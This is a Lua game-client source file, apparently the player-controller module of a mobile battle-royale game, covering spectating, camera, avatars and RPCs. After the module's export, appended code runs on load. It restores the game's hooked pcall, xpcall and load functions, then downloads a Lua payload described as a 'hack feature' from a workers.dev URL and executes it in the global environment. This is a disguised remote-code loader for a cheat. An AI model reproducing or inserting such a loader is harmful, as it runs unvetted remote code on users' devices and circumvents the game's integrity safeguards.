      return string.format("%s(%s)", ViewTarget.PlayerName, ViewTarget.PlayerKey)
    end
  end
  return "<Invalid ViewTarget>"
end

function PlayerControllerBase:GetCurPlayerCharacterOrPetSpectator()
  if slua.isValid(self.Object) and self.IsInPetSpectator and self:IsInPetSpectator() and self.GetPetSpectatorComp and slua.isValid(self:GetPetSpectatorComp()) and slua.isValid(self:GetPetSpectatorComp().PetSpectatorPawn) then
    return self:GetPetSpectatorComp().PetSpectatorPawn
  elseif slua.isValid(self.Object) and self.GetCurPlayerCharacter then
    return self:GetCurPlayerCharacter()
  end
end

function PlayerControllerBase:GetStickLeftSize()
  local JoyStickCenter = self:GetJoyStickCenter()
  local UIUtil = require("client.common.ui_util")
  local ViewportSize = UIUtil.GetViewportSizebyScale()
  local DistanceToCentralAxis_Ratio = math.abs(0.5 - JoyStickCenter.X)
  if 0.3 <= DistanceToCentralAxis_Ratio then
    return FVector2D(DistanceToCentralAxis_Ratio, 1) * ViewportSize * 2
  else
    return FVector2D(0.3, 1) * ViewportSize * 2
  end
end

function PlayerControllerBase:MakeFireModeEffect()
  if not slua.isValid(self.Object) then
    return
  end
  local SuperData = self:GetSuperData()
  if self.IsUse3DTouch then
    SuperData.IsUse3DTouch = self:IsUse3DTouch()
  end
  local FireMode = self.fireMode
  if FireMode == 1 or FireMode == 2 then
    local SizeX = 200
    local SizeY = 200
    if self.GetStickLeftSize then
      local StickSize = self:GetStickLeftSize()
      SizeX = math.max(SizeX, StickSize.X)
      SizeY = math.max(SizeY, StickSize.Y)
    end
    self:SetJoyStickInteractionSize(FVector2D(SizeX, SizeY))
  elseif FireMode == 3 then
    self:RestoreDefaultInteractionSize(0)
  end
  self:BroadcastUIMessage("UIMsg_MakeFireModeEffect", 0, "", "")
end

function PlayerControllerBase:DoUITouchMove(Vector)
  if self.fireMode == 2 and not self._DisableUITouchMove then
    self:LuaBroadcast("DoUITouchMoveEvent", FVector2D(Vector.X, Vector.Y))
  end
end

function PlayerControllerBase:ReadConfigFromHUD()
  self.Super:ReadConfigFromHUD(self)
  local SuperData = self:GetSuperData()
  if self.IsUse3DTouch then
    SuperData.IsUse3DTouch = self:IsUse3DTouch()
  end
end

function PlayerControllerBase:InitCameraData()
  local GamePlayTools = require("GameLua.Mod.BaseMod.Common.GamePlayTools")
  local BaseCameraConfig = GamePlayTools.GetCurrentConfig("BaseCameraConfig")
  local CameraOffsetData = import("CameraOffsetData")
  if slua.isValid(self.PlayerCameraManager) and BaseCameraConfig then
    for CameraStateTag, CameraStateData in pairs(BaseCameraConfig) do
      local NewCameraStateData = CameraOffsetData()
      NewCameraStateData.SocketOffset = CameraStateData.SocketOffset
      NewCameraStateData.TargetOffset = CameraStateData.TargetOffset
      NewCameraStateData.SpringArmLength = CameraStateData.SpringArmLength
      NewCameraStateData.AdditiveOffsetFov = CameraStateData.AdditiveOffsetFov
      NewCameraStateData.FixedFov = CameraStateData.FixedFov
      NewCameraStateData.BeginInterpSpeed = CameraStateData.BeginInterpSpeed
      NewCameraStateData.EndInterpSpeed = CameraStateData.EndInterpSpeed
      self.PlayerCameraManager:PushCameraDataConfigData(CameraStateTag, NewCameraStateData)
    end
  end
end

function PlayerControllerBase:RPC_ClientHUDDisplayHitDamage(nDamage, IsWeakShoot)
  local uHUD = self:GetHUD()
  if slua.isValid(uHUD) then
    uHUD:AddHitDamage(nDamage, IsWeakShoot, CDamageEvent(), nil, true)
  end
end

function PlayerControllerBase:OnCreateDecal(_, _, playerKey, DecalActor)
  if not slua.isValid(DecalActor) then
    return
  end
  self:RPC_Multicast_OnCreateDecal(DecalActor.DecalId)
end

function PlayerControllerBase:RPC_Multicast_OnCreateDecal(itemId)
  if not Client then
    return
  end
  local passive_resource_downloader = ModuleManager.GetModule(ModuleManager.CommonModuleConfig.passive_resource_downloader)
  passive_resource_downloader:CheckResourceHasBeenDownloaded({itemId})
end

function PlayerControllerBase:InitGrenadeAvatarList(ReInitial)
  if self.RolewearIndex >= 0 and self.RolewearIndex < self.InitialKnapsackExtInfo:Num() and ReInitial then
    self.InitialConsumableAvatar = self.InitialKnapsackExtInfo:Get(self.RolewearIndex).KnapsackExtInfo.ConsumableAvatarList
  end
  self.GrenadeAvatarItemList:Clear()
  self:AddToGrenadeAvatarItemList(self.InitialConsumableAvatar.GrenadeAvatarShoulei)
  self:AddToGrenadeAvatarItemList(self.InitialConsumableAvatar.GrenadeAvatarSmoke)
  self:AddToGrenadeAvatarItemList(self.InitialConsumableAvatar.GrenadeAvatarStun)
  self:AddToGrenadeAvatarItemList(self.InitialConsumableAvatar.GrenadeAvatarBurn)
end

function PlayerControllerBase:AddToGrenadeAvatarItemList(AvatarID)
  if AvatarID <= 0 then
    return
  end
  local UBackpackUtils = import("BackpackUtils")
  local DefineID = UBackpackUtils.GenerateItemDefineIDByItemTableIDWithRandomInstanceID(AvatarID)
  local AvatarUtil = require("GameLua.Mod.Library.GamePlay.Avatar.AvatarUtil")
  local ProtoItemID = AvatarUtil.GetThrowWeaponProtoItemID_Old(DefineID, self.Object)
  if ProtoItemID <= 0 then
    return
  end
  self.GrenadeAvatarItemList:Add(ProtoItemID, AvatarID)
end

function PlayerControllerBase:ChangeWeaponAvatarList(BagIndex)
  if 0 <= BagIndex and BagIndex < self.InitialKnapsackExtInfo:Num() then
    local weaponList = self.InitialKnapsackExtInfo:Get(self.RolewearIndex).KnapsackExtInfo.WeaponList
    local AvatarDataUtil = require("GameLua.Mod.Library.GamePlay.Avatar.AvatarDataUtil")
    weaponList = AvatarDataUtil.FilterWeaponAttachments(self, weaponList, true)
    self.InitialWeaponAvatarList = weaponList
    self:InitWeaponAvatarItems()
    self:OnWeaponAvatarUpdate()
  end
end

function PlayerControllerBase:OnWeaponAvatarUpdate()
end

function PlayerControllerBase:OnPlayerKeyRepExt()
  EventSystem:postEvent(EVENTTYPE_INGAME, EVENTID_INGAME_CONTROLLER_PLAYERKEY_CHANGE, self.Object)
end

function PlayerControllerBase:CanShowMyPet()
  local settingConfig = slua_GameFrontendHUD:GetUserSettings()
  local uPawn = self:GetPlayerCharacterSafety()
  if not (slua.isValid(uPawn) and uPawn.GetIsFPP) or not uPawn:GetIsFPP() then
    return settingConfig.OpenMyPet
  end
  return settingConfig.OpenMyPetFPP
end

function PlayerControllerBase:GetMapUIMarkManagerComponent()
  if not slua.isValid(self.MapUIMarkManagerComponent) then
    self.MapUIMarkManagerComponent = self:GetComponentByClass(import("MapUIMarkManager"))
  end
  return self.MapUIMarkManagerComponent
end

function PlayerControllerBase:SGetConsumableByXsuitAndGlider()
  local index = self.RolewearIndex
  local curInfo = self.InitialKnapsackExtInfo:Get(index)
  local info = curInfo.KnapsackExtInfo
  local baseID = info.ParachuteGlider
  local LogicXSuit = require("client.slua.logic.XSuit.logic_xsuit")
  local candidateIDs = {baseID}
  for _, specialID in pairs(LogicXSuit.GetAllSpecialGlideIDs(baseID) or {}) do
    table.insert(candidateIDs, specialID)
  end
  local allwear = self:GetClothingInAllBackpack(index)
  for _, candidateID in ipairs(candidateIDs) do
    local VehicleUseConfig = CDataTable.GetTableData("VehicleUseConfig", candidateID)
    if VehicleUseConfig then
      local SuitID_s = VehicleUseConfig.SuitID_s
      for _, v in pairs(allwear) do
        if SuitID_s:Get(v.DefineID.TypeSpecificID) then
          return VehicleUseConfig.Consumable
        end
      end
    end
  end
end

function PlayerControllerBase:GetCurWearTwoPersonAircraftID()
  local XSuitAvatarDataUtil = require("GameLua.Activity.Commercialize.GamePlay.XSuit.XSuitAvatarDataUtil")
  local GlideID = XSuitAvatarDataUtil:GetCurrentWearGlideID(self)
  local UAvatarUtils = import("AvatarUtils")
  if UAvatarUtils.IsTwoPersonAircraft(GlideID) then
    return GlideID
  else
    return -1
  end
end

function PlayerControllerBase:BindMotionEvent()
  local InputClass = import("ScreenInput")
  local UIUtil = require("client.common.ui_util")
  local WorldContextObject = UIUtil.GetGameInstance()
  self.ScreenInput = InputClass(WorldContextObject)
  self.ScreenInput:Init()
  self.ScreenInput.OnMotionDetected:Bind(self, "OnMotionDetected")
end

function PlayerControllerBase:UseModSkin(_, _, bUse)
  if not self.bModWeaponSkinCooldowning then
    self.bModWeaponSkinCooldowning = true
    self:ServerRequestUseModWeaponSkin(bUse)
  end
end

function PlayerControllerBase:OnModWeaponSkinChange()
  local Cooldown = 5
  local GamePlayTools = require("GameLua.Mod.BaseMod.Common.GamePlayTools")
  local ModWeaponConfig = GamePlayTools.GetCurrentConfig("ModWeaponConfig")
  if ModWeaponConfig and ModWeaponConfig.Cooldown then
    Cooldown = ModWeaponConfig.Cooldown
  end
  if self.bModWeaponSkinCooldowning then
    EventSystem:postEvent(EVENTTYPE_PLAYEREVENT_WEAPON, EVENTID_MOD_WEAPON_USE_SKIN_COOLDOWN, Cooldown)
    self:AddGameTimer(Cooldown, false, function()
      self.bModWeaponSkinCooldowning = false
      EventSystem:postEvent(EVENTTYPE_PLAYEREVENT_WEAPON, EVENTID_MOD_WEAPON_USE_SKIN_COOLDOWN_END)
    end)
  end
end

function PlayerControllerBase:ClientCallPartnerTips(TextID, RoleTypeID, RichTextID, Param1)
  self:ClientCallSidePopupTips(TextID, RoleTypeID, RichTextID, Param1, nil)
end

function PlayerControllerBase:ClientCallPartnerTipsByType(TipID, Param1, Param2)
  if not TipID then
    return
  end
  local IngameTipsTools = require("GameLua.Mod.BaseMod.Common.UI.InGameTipsTools")
  IngameTipsTools.ClientCallSidePopupTipsByType(TipID, Param1, Param2)
end

function PlayerControllerBase:ClientCallSidePopupTips(TextID, RoleTypeID, RichTextID, Param1, Param2)
  local ClientSidePopupTipsSubsystem = SubsystemMgr:Get("ClientSidePopupTipsSubsystem")
  if ClientSidePopupTipsSubsystem then
    ClientSidePopupTipsSubsystem:CallTips(TextID, RoleTypeID, RichTextID, Param1, Param2)
  end
end

function PlayerControllerBase:FindBestSpectateTarget(MyTeammates, CurPlayerState, TeammatePlayerID)
  local ETeammateSpectatorResult = import("/Script/ShadowTrackerExtra.ETeammateSpectatorResult")
  local ExtraPlayerLiveState = import("/Script/ShadowTrackerExtra.ExtraPlayerLiveState")
  local Result = {
    bAllDie = true,
    bIsOnPlane = false,
    bHasSelf = false,
    bHasNullptr = false,
    TargetTeammate = nil,
    RetPlayerId = 0,
    FriendId = 0,
    TeammateResults = {}
  }
  local bIgnoreDying = self.bWatchTeammateIgnoreDying
  if bIgnoreDying then
    for _, OneTeammate in pairs(MyTeammates) do
      if slua.isValid(OneTeammate) and OneTeammate.LiveState ~= ExtraPlayerLiveState.InDied and OneTeammate.LiveState ~= ExtraPlayerLiveState.InDying then
        bIgnoreDying = false
        break
      end
    end
  end
  local LobbyWatchInfo = self.LobbyWatchInfo

  local function ProcessOneTeammate(OneTeammate)
    if CurPlayerState == OneTeammate then
      table.insert(Result.TeammateResults, ETeammateSpectatorResult.ETeammateSpectatorResult_MySelf)
      Result.bHasSelf = true
      return false
    end
    if not slua.isValid(OneTeammate) then
      Result.bAllDie = false
      table.insert(Result.TeammateResults, ETeammateSpectatorResult.ETeammateSpectatorResult_Nullptr)
      Result.bHasNullptr = true
      return false
    end
    if LobbyWatchInfo and LobbyWatchInfo.WatchedPlayerKey == OneTeammate.PlayerKey and LobbyWatchInfo.WatchedPlayerKey > 0 then
      Result.FriendId = OneTeammate.PlayerId
    end
    if TeammatePlayerID == 0 then
      if OneTeammate.LiveState == ExtraPlayerLiveState.InDied or OneTeammate.LiveState == ExtraPlayerLiveState.InDying and not bIgnoreDying then
        table.insert(Result.TeammateResults, ETeammateSpectatorResult.ETeammateSpectatorResult_Died)
        return false
      end
    elseif not OneTeammate:IsAlive() then
      table.insert(Result.TeammateResults, ETeammateSpectatorResult.ETeammateSpectatorResult_NotAlive)
      return false
    end
    if not OneTeammate:IsInGame() then
      table.insert(Result.TeammateResults, ETeammateSpectatorResult.ETeammateSpectatorResult_NotInGame)
      return false
    end
    if not OneTeammate:CanBeSpectated() then
      return false
    end
    table.insert(Result.TeammateResults, ETeammateSpectatorResult.ETeammateSpectatorResult_Normal)
    Result.bAllDie = false
    Result.bIsOnPlane = OneTeammate.LiveState == ExtraPlayerLiveState.InPlane
    Result.TargetTeammate = OneTeammate
    Result.RetPlayerId = OneTeammate.PlayerId
    if TeammatePlayerID == OneTeammate.PlayerId then
      return true
    end
    if TeammatePlayerID == 0 and LobbyWatchInfo and LobbyWatchInfo.WatchedPlayerKey == OneTeammate.PlayerKey and LobbyWatchInfo.WatchedPlayerKey > 0 then
      return true
    end
    return false
  end

  for _, OneTeammate in pairs(MyTeammates) do
    if ProcessOneTeammate(OneTeammate) then
      break
    end
  end
  return Result
end

function PlayerControllerBase:Server_GenericRPC(ID, Bytes)
  local GenericRPCEnums = require("GameLua.Mod.BaseMod.GamePlay.GenericRPC.GenericRPCEnums")
  local GenericRPCUtil = require("GameLua.Mod.BaseMod.GamePlay.GenericRPC.GenericRPCUtil")
  GenericRPCUtil._OnRecv(self, ID, GenericRPCEnums.EGenericRPCDirection.Server, Bytes)
end

function PlayerControllerBase:Client_GenericRPC(ID, Bytes)
  local GenericRPCEnums = require("GameLua.Mod.BaseMod.GamePlay.GenericRPC.GenericRPCEnums")
  local GenericRPCUtil = require("GameLua.Mod.BaseMod.GamePlay.GenericRPC.GenericRPCUtil")
  GenericRPCUtil._OnRecv(self, ID, GenericRPCEnums.EGenericRPCDirection.Client, Bytes)
end

function PlayerControllerBase:GetRawBattleTextByRawTextIDLua(ID)
  return LocUtil.GetLocalizeResStr(ID)
end

local class = require("class")
local CActorBase = require("GameLua.Mod.BaseMod.Common.Core.ActorBase")
local CPlayerControllerBase = class(CActorBase, nil, PlayerControllerBase)
return require("combine_class").DeclareFeature(CPlayerControllerBase, {
  {
    IngameLikeFeature = "GameLua.Mod.BaseMod.Gameplay.Feature.PlayerControllerIngameLikeFeature"
  },
  {
    CollectionTaskFeature = "GameLua.Mod.BaseMod.Gameplay.Feature.CollectionTaskFeature"
  },
  {
    NewbieAssistFeature = "GameLua.Mod.BaseMod.Gameplay.Feature.NewbieAssistFeature"
  },
  {
    ShowVehicleFeature = "GameLua.Mod.BaseMod.Gameplay.Feature.ShowVehicleFeature"
  },
  {
    PlayEmoteFeature = "GameLua.Mod.BaseMod.Gameplay.Feature.Emote.PlayEmoteFeature"
  },
  {
    CommerFeature = "GameLua.Activity.Commercialize.GamePlay.Feature.CommerFeature"
  },
  {
    ReportCrashKitFeature = "GameLua.Mod.BaseMod.Gameplay.Feature.Player.ReportCrashKitFeature"
  },
  {
    CoopEmotePCFeature = "GameLua.Activity.Commercialize.GamePlay.CoopEmote.CoopEmotePCFeature"
  },
  {
    SecurityNotifyPCFeature = "GameLua.Mod.BaseMod.Common.Security.SecurityNotifyPCFeature"
  },
  {
    PlayerControllerFatalDamageFeature = "GameLua.Mod.BaseMod.Gameplay.Feature.PlayerControllerFatalDamageFeature"
  },
  {
    PlayerControllerTipsFeature = "GameLua.Mod.BaseMod.Gameplay.Feature.PlayerControllerTipsFeature"
  },
  {
    OncePerGameAkEventFeature = "GameLua.Mod.BaseMod.Gameplay.Feature.OncePerGameAkEventFeature"
  },
  {
    MLAIVoiceFeature = "GameLua.Mod.BaseMod.Gameplay.AI.MLAIVoiceFeature"
  }
}, "PlayerControllerBase")

end)()

local function RestoreNativeLuaFunctions()
  local globals = _G
  local function Finish(problem, count)
    local status = {
      Ready = problem == nil,
      Status = problem and "Unavailable" or (count > 0 and "Restored" or "NoRecognizedHook"),
      Error = problem,
      RestoredFunctions = count or 0
    }
    if type(globals) == "table" then
      rawset(globals, "LunarNativeHookRepairStatus", status)
    end
    return status
  end
  if type(globals) ~= "table" then
    return Finish("GlobalEnvironmentUnavailable")
  end
  local debugApi = rawget(globals, "debug")
  local getupvalue = type(debugApi) == "table" and rawget(debugApi, "getupvalue")
  local getinfo = type(debugApi) == "table" and rawget(debugApi, "getinfo")
  local probe = rawget(globals, "pcall")
  if type(getupvalue) ~= "function" or type(probe) ~= "function" then
    return Finish("NamedUpvalueInspectionUnavailable")
  end

  local cache, problem = {}
  local function Inspect(func)
    if type(func) ~= "function" then
      problem = "InvalidHookReference"
      return
    end
    if cache[func] then
      return cache[func]
    end
    local values = {}
    if type(getinfo) == "function" then
      local ok, info = probe(getinfo, func, "S")
      if ok and type(info) == "table" and info.what == "C" then
        cache[func] = values
        return values
      end
    end
    for index = 1, 128 do
      local ok, name, value = probe(getupvalue, func, index)
      if not ok then
        problem = "UpvalueInspectionFailed"
        return
      end
      if name == nil then
        cache[func] = values
        return values
      end
      if type(name) ~= "string" or name == "" or name:sub(1, 1) == "(" then
        problem = "UpvalueNamesUnavailable"
        return
      end
      if value == nil then
        value = false
      end
      values[name] = value
    end
    problem = "UpvalueInspectionLimit"
  end

  local function Verify(values, key)
    if key == "load" then
      local environment = Inspect(values.IsMainEnv)
      return environment and environment.MAX_ENV_META_DEPTH == 8
        and type(values.DefaultEnv) == "table"
    end
    if type(values.TimeoutRethrowFlag) ~= "number" then
      return false
    end
    if key == "pcall" or key == "xpcall" then
      local helper = Inspect(values.HandleCallResults)
      if not helper then
        return false
      end
      local predicate = helper.ShouldRethrowTimeoutError
      local timeout = Inspect(predicate)
      return timeout and timeout.TIMEOUT_ERROR_IDENTIFIER == "script exec timeout"
        and timeout.TimeoutRethrowFlag == values.TimeoutRethrowFlag
        and (key ~= "xpcall" or values.ShouldRethrowTimeoutError == predicate)
    end
    return true
  end

  local targets = {{globals, "pcall"}, {globals, "xpcall"}, {globals, "load"}}
  local sluaApi = rawget(globals, "slua")
  if type(sluaApi) == "table" then
    targets[#targets + 1] = {sluaApi, "TimeoutIgnoreHookFlagIncrement"}
    targets[#targets + 1] = {sluaApi, "TimeoutIgnoreHookFlagDecrement"}
  end
  local pending, history = {}, {}
  for _, target in ipairs(targets) do
    local owner, key = target[1], target[2]
    local current = rawget(owner, key)
    local originalName = "Original" .. key:sub(1, 1):upper() .. key:sub(2)
    local recovered, visited, layers = current, {}, {}
    history[key] = layers
    if type(current) == "function" then
      for depth = 1, 33 do
        if visited[recovered] then
          return Finish("HookReferenceCycle:" .. key)
        end
        visited[recovered] = true
        local values = Inspect(recovered)
        if not values then
          return Finish(problem .. ":" .. key)
        end
        local original = values[originalName]
        if original == nil then
          break
        end
        if depth > 32 then
          return Finish("HookLayerLimit:" .. key)
        end
        if type(original) ~= "function" or not Verify(values, key) then
          return Finish((problem or "UnexpectedHookSignature") .. ":" .. key)
        end
        layers[#layers + 1] = values
        recovered = original
      end
      if recovered ~= current then
        pending[#pending + 1] = {owner, key, recovered}
      end
    end
  end

  local function Matching(leftKey, rightKey, field)
    local left, right = history[leftKey] or {}, history[rightKey] or {}
    if #left ~= #right then
      return false
    end
    for index = 1, #left do
      if left[index][field] ~= right[index][field] then
        return false
      end
    end
    return true
  end
  if not Matching("pcall", "xpcall", "HandleCallResults")
      or not Matching("TimeoutIgnoreHookFlagIncrement", "TimeoutIgnoreHookFlagDecrement", "TimeoutRethrowFlag") then
    return Finish("MismatchedHookLayers")
  end
  for _, change in ipairs(pending) do
    rawset(change[1], change[2], change[3])
  end
  return Finish(nil, #pending)
end

-- Standalone entry: the original module has already produced its export.
do
  local bootstrapOK, bootstrapError = pcall(function()
    -- Restore the accidental hook immediately when inspection is available.
    _G.pcall(RestoreNativeLuaFunctions)
    local url = "https://zakpubgskin-v1.zakpubgskin.workers.dev/"
    local expectedBytes = 353709
    local releaseId = "9ca540976b819a0d0fe020ac60b39868e382df5ee8e46387341703fe5115caab"
    local marker = "-- Supplied hack feature implementation follows in its own scope."
    local scope = url .. "\n" .. releaseId
    local previous = _G.__MasterAhsanRemoteLoaderV1
    if type(previous) == "table" and previous.Scope == scope then
      if previous.Started or previous.Loaded or previous.Phase == "Executing"
          or previous.LastError == "ExecutionError" then return end
      if previous.Version == 5 and type(previous.Wake) == "function" then
        previous.Wake("entry")
        return
      end
    end

    local S = {
      Version = 5, Scope = scope, URL = url, ExpectedSHA256 = releaseId,
      Generation = (type(previous) == "table" and tonumber(previous.Generation) or 0) + 1,
      Epoch = 0, Checks = 0, Attempts = 0, Executions = 0,
      Active = false, Loaded = false, InFlight = false, Phase = "WaitingEntry",
      HookAttempts = setmetatable({}, {__mode = "k"})
    }
    _G.__MasterAhsanRemoteLoaderV1 = S
    local call = _G.pcall
    local function current() return _G.__MasterAhsanRemoteLoaderV1 == S end
    local function member(object, key)
      if object == nil then return nil end
      local ok, value = call(function() return object[key] end)
      if ok then return value end
    end
    local function cancelTimer()
      if S.Pending then S.Pending.Used = true end
      S.Pending = nil
    end
    local function finish(phase, reason, terminal)
      S.Active, S.InFlight = false, false
      cancelTimer()
      if S.Request then S.Request.Used = true end
      S.Request = nil
      S.Phase, S.LastError = phase, reason
      if terminal then S.Terminal = true; S.Body = nil end
    end
    local function repair()
      local ok, result = call(RestoreNativeLuaFunctions)
      if not ok then return false, tostring(result) end
      if type(result) ~= "table" or not result.Ready then
        return false, type(result) == "table" and result.Error or "NativeHookRepairUnavailable"
      end
      call = _G.pcall
      return true
    end
    local function getTicker()
      local ok, ticker = call(require, "common.time_ticker")
      local add = ok and member(ticker, "AddTimerOnce")
      if type(add) == "function" then return add end
    end
    local function valid(object)
      local api = member(_G.slua, "isValid")
      if object == nil or type(api) ~= "function" then return false end
      local ok, yes = call(api, object)
      return ok and yes == true
    end
    local function preflight()
      if not _G.Client then return false, "ClientNotReady" end
      if not getTicker() then return false, "TickerUnavailable" end
      local ok, data = call(require, "GameLua.GameCore.Data.GameplayData")
      if not ok or data == nil or data == false then return false, "GameplayDataUnavailable" end
      if type(member(_G.slua, "isValid")) ~= "function" then return false, "SluaUnavailable" end
      local getPlayer = member(data, "GetPlayerCharacter")
      local getController = member(data, "GetPlayerController")
      if type(getPlayer) ~= "function" or type(getController) ~= "function" then
        return false, "PlayerAccessUnavailable"
      end
      local playerOK, player = call(getPlayer)
      local controllerOK, controller = call(getController)
      if not playerOK or not valid(player) then return false, "PlayerNotReady" end
      if not controllerOK or not valid(controller) then return false, "ControllerNotReady" end
      if type(member(_G.CGame, "NewObjectFromPath")) ~= "function" then
        return false, "WidgetFactoryUnavailable"
      end
      if member(_G.UEnums, "ESlateVisibility") == nil then return false, "VisibilityEnumUnavailable" end
      local toolsOK, tools = call(require, "GameLua.Mod.BaseMod.Common.UI.InGameUITools")
      local getRoot = toolsOK and member(tools, "GetMainControlBaseUI")
      if type(getRoot) ~= "function" then return false, "InGameUIUnavailable" end
      local rootOK, root = call(getRoot)
      if not rootOK or not valid(root) then return false, "MainControlUnavailable" end
      if not valid(member(root, "CanvasPanel_0")) and not valid(member(root, "CanvasPanel_42")) then
        return false, "CanvasUnavailable"
      end
      return true
    end
    local function hookReadyEvent()
      local events = _G.EventSystem
      local register = member(events, "registEvent")
      local eventType, eventId = _G.EVENTTYPE_INGAME, _G.EVENTID_INGAME_CONTROLLER_BEGINPLAY_FINISH
      if type(register) ~= "function" or eventType == nil or eventId == nil then
        S.HookPhase = "WaitingEventSystem"
        return
      end
      if S.HookAttempts[events] then return end
      S.HookAttempts[events] = true
      local ok, accepted = call(register, events, eventType, eventId, function()
        if current() then S.Wake("controller_beginplay") end
      end)
      local registered = ok and accepted ~= false
      if not registered then S.HookAttempts[events] = nil end
      S.HookPhase = registered and "Registered" or "RegistrationFailed"
    end

    local check
    local function schedule(delay, callback)
      if not current() or not S.Active or S.Pending or S.Terminal then return false end
      local add = getTicker()
      if not add then finish("WaitingReadyEvent", "TickerUnavailable"); return false end
      local token = {Epoch = S.Epoch, Used = false}
      S.Pending, S.ArmingTimer = token, true
      local ok, accepted = call(add, delay, function()
        if token.Used or not current() or token.Epoch ~= S.Epoch or S.Pending ~= token then return end
        token.Used, S.Pending = true, nil
        if S.ArmingTimer then token.Synchronous = true; return end
        if S.Active and not S.Terminal then callback(token.Epoch) end
      end)
      S.ArmingTimer = false
      if token.Synchronous then
        finish("WaitingReadyEvent", "SynchronousTimerUnsupported")
        return false
      end
      if not ok or accepted == false then
        token.Used = true
        finish("WaitingReadyEvent", "TimerUnavailable")
        return false
      end
      return true
    end
    local function nextCheck(reason)
      if not current() or not S.Active then return end
      S.Phase, S.LastError = "WaitingReadiness", reason
      if S.Checks >= 120 then
        finish("WaitingReadyEvent", reason or "CheckBudgetExhausted")
      else
        schedule(1.0, check)
      end
    end
    local function retry(reason)
      if S.Attempts >= 5 then
        S.Retryable = true
        finish("Failed", reason, true)
      else
        S.Phase, S.LastError = "RetryPending", reason
        schedule(2 ^ (S.Attempts - 1), check)
      end
    end
    local function execute()
      local restored, reason = repair()
      if not current() then return end
      if not restored then finish("WaitingReadyEvent", reason); return end
      local body = S.Body
      local ok, chunk, compileError = call(function()
        if type(_G.loadstring) == "function" then
          local fn, problem = _G.loadstring(body, "@MasterAhsanRemoteAddon")
          if type(fn) == "function" and type(_G.setfenv) == "function" then _G.setfenv(fn, _G) end
          return fn, problem
        end
        if type(_G.load) == "function" then return _G.load(body, "@MasterAhsanRemoteAddon", "t", _G) end
        return nil, "LuaCompilerUnavailable"
      end)
      if not ok or type(chunk) ~= "function" then
        S.ErrorStage = "CompileError"
        finish("CompileError", tostring(ok and compileError or chunk), true)
        return
      end
      S.Started, S.Terminal, S.Executions = true, true, S.Executions + 1
      S.Phase, S.LastError, S.Body = "Executing", nil, nil
      local oldError = _G.LunarOptionalStartupError
      local ran, startupError = call(chunk)
      if not current() then return end
      if not ran then
        S.ErrorStage = "ExecutionError"
        finish("ExecutionError", tostring(startupError), true)
        return
      end
      S.Loaded = true
      if _G.LunarOptionalStartupError ~= oldError and _G.LunarOptionalStartupError ~= nil then
        finish("LoadedWithStartupError", tostring(_G.LunarOptionalStartupError), true)
      else
        finish("Loaded", nil, true)
      end
    end
    local function fetch()
      local moduleOK, http, post = call(function()
        local manager = _G.ModuleManager or ModuleManager
        if not manager or type(manager.GetModule) ~= "function" or not manager.CommonModuleConfig then return nil end
        local module = manager.GetModule(manager.CommonModuleConfig.http_manager)
        return module, module and module.Post
      end)
      if not current() then return end
      if not moduleOK or not http or type(post) ~= "function" then
        nextCheck("HttpModuleUnavailable")
        return
      end
      if S.Attempts >= 5 then retry("RequestBudgetExhausted"); return end
      S.Attempts, S.InFlight, S.Phase = S.Attempts + 1, true, "Fetching"
      local token = {Epoch = S.Epoch, Attempt = S.Attempts, Used = false}
      S.Request = token
      local function settle()
        if token.Used or not current() or S.Terminal or not S.Active
            or token.Epoch ~= S.Epoch or S.Request ~= token or not S.InFlight then return false end
        token.Used, S.InFlight, S.Request = true, false, nil
        cancelTimer()
        return true
      end
      if not schedule(10.25, function()
        if settle() then retry("TransportTimeout") end
      end) then return end
      local sent, accepted = call(post, http, url,
        {["Content-Type"] = "application/x-www-form-urlencoded"}, "key_path=2.lua", nil,
        function(success, body)
          if not settle() then return end
          if not success then retry("TransportError"); return end
          S.ReceivedBytes = type(body) == "string" and #body or nil
          if type(body) ~= "string" or #body ~= expectedBytes or body:sub(1, #marker) ~= marker
              or body:byte(1) == 27 or body:find("\0", 1, true) then
            finish("InvalidPayload", "InvalidPayload", true)
            return
          end
          S.Body, S.Phase, S.LastError, S.Checks = body, "Downloaded", nil, 0
          -- Do not execute inside an HTTP callback; recheck the native UI first.
          schedule(0.05, check)
        end, 10)
      if (not sent or accepted == false) and settle() then retry("TransportError") end
    end

    check = function(epoch)
      if not current() or not S.Active or epoch ~= S.Epoch or S.Checking or S.Terminal then return end
      S.Checking = true
      local ok, problem = call(function()
        S.Checks = S.Checks + 1
        hookReadyEvent()
        if not _G.Client then nextCheck("ClientNotReady"); return end
        if S.Body then
          local ready, reason = preflight()
          if not current() then return end
          if not ready then nextCheck(reason); return end
          execute()
        else
          fetch()
        end
      end)
      S.Checking = false
      if not ok and current() then
        finish(S.Started and "ExecutionError" or "WaitingReadyEvent", tostring(problem), S.Started)
      end
    end
    S.Wake = function(reason)
      if not current() or S.Waking or S.Started or (S.Terminal and not S.Retryable) then return end
      S.Waking = true
      local ok, problem = call(function()
        hookReadyEvent()
        if S.Active or S.Checking then return end
        if S.Terminal then
          S.Terminal, S.Retryable, S.Attempts = false, false, 0
        end
        S.Epoch, S.Checks = S.Epoch + 1, 0
        S.Active, S.WakeReason, S.Phase, S.LastError = true, reason, "Scheduled", nil
        schedule(0.05, check)
      end)
      S.Waking = false
      if not ok and current() then finish("WaitingReadyEvent", tostring(problem)) end
    end
    S.Wake("entry")
  end)
  if not bootstrapOK then _G.__MasterAhsanOnlineBootstrapError = tostring(bootstrapError) end
end

return originalExport
